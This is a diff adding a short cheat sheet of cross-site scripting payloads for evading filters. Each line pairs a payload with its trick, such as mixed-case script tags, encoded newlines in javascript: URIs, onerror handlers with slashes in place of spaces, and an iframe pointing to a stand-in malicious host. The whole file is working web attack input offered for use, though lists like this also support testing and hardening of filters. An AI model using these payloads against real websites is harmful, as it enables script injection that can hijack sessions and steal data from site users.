@@ -1,0 +1,9 @@
+<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
+<<script>alert(XSS)</script> #prepending an additional "<"
+<script>alert(XSS) // #removing the closing tag
+<script>alert`XSS`</script> #using backticks instead of parenetheses
+java%0ascript:alert(1) #using encoded newline characters
+<iframe src=http://malicous.com < #double open angle brackets
+<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
+<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
